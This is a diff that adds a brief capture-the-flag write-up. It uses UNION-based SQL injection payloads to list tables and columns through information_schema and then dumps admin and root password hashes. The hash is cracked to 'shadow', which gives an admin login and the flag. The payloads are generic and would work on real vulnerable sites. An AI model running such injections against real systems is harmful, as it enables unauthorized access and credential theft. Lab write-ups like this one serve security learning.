@@ -1,0 +1,17 @@
+get all tables with : 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables
+we find the table -> db_default and the database Member_Brute_Force
+get all colums with : 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
+we find the field username and password in the db_default table
+
+
+1=1 UNION SELECT username, password FROM Member_Brute_Force.db_default
+
+
+First name: root
+Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
+
+First name: admin
+Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
+
+we md5 decrypt the admin password we get "shadow"
+we login with the username admin and the password shadow and get the flag :)
